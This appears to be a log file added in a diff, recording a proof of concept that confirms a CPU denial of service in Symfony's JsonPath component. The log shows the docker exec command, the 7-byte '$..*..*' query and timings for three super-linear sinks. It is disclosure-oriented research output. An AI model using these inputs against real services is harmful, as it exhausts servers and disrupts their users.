@@ -1,0 +1,29 @@
+[INFO] VULN-006 — JsonPath attacker-query DoS (3 uncapped sinks)
+[INFO] target container=cvehunterlab_symfony_app  (queries are 7-20 bytes; documents built at runtime)
+[STEP] running component PoC inside the live container: docker exec -i -e JSONPATH_SRC=/src/src/Symfony/Component/JsonPath -e SIZES_B=500,1000,2000 -e DEPTHS_A=4,5,6 -e SIZES_C=25000,50000,100000 cvehunterlab_symfony_app php -d memory_limit=256M
+B n=500 bytes=4906 matches=0 time=0.1050
+B n=1000 bytes=9906 matches=0 time=0.3726
+B n=2000 bytes=20906 matches=0 time=1.6198
+A depth=4 bytes=2381 nodes=912 time=0.0012
+A depth=5 bytes=9549 nodes=5008 time=0.0164
+A depth=6 bytes=38221 nodes=25488 time=0.3417
+C len=25000 bytes=25020 time=0.0142
+C len=50000 bytes=50020 time=0.0238
+C len=100000 bytes=100020 time=0.0484
+[STEP] (b) $-rooted filter operand re-decodes the whole document per element
+[INFO]     N=500    docBytes=4906    matches=0  0.1050s
+[INFO]     N=1000   docBytes=9906    matches=0  0.3726s
+[INFO]     N=2000   docBytes=20906   matches=0  1.6198s
+[PROOF] (b) fitted exponent time~N^1.97 (1=linear, 2=quadratic); last doubling x4.3 (linear would be x2)
+[STEP] (a) recursive-descent '..' node-set explosion (fixed 7-byte query '$..*..*')
+[INFO]     tree(depth=4,b=4) docBytes=2381   nodeset=912     0.0012s
+[INFO]     tree(depth=5,b=4) docBytes=9549   nodeset=5008    0.0164s
+[INFO]     tree(depth=6,b=4) docBytes=38221  nodeset=25488   0.3417s
+[PROOF] (a) a 7-byte query returns a node-set up to 25488 nodes; time~bytes^2.04 (super-linear) for a 4x-per-step document
+[STEP] (c) tokenizer scans the full (uncapped) filter text before the length cap applies
+[INFO]     filterLen=25000  queryBytes=25020    0.0142s
+[INFO]     filterLen=50000  queryBytes=50020    0.0238s
+[INFO]     filterLen=100000 queryBytes=100020   0.0484s
+[PROOF] (c) tokenizer cost grows with query length (exponent 0.88) despite MAX_FILTER_EXPRESSION_LENGTH=10000 — it is enforced only after tokenize()
+[OK] VULN-006 CONFIRMED — super-linear CPU blowup from attacker-controlled JsonPath queries: sink (b) time~N^1.97 (O(N^2) re-decode), sink (a) node-set explosion time~bytes^2.04, sink (c) uncapped tokenizer scan.
+==> VULN-006: CONFIRMED — attacker JsonPath query => super-linear worker CPU DoS (sinks a,b,c).
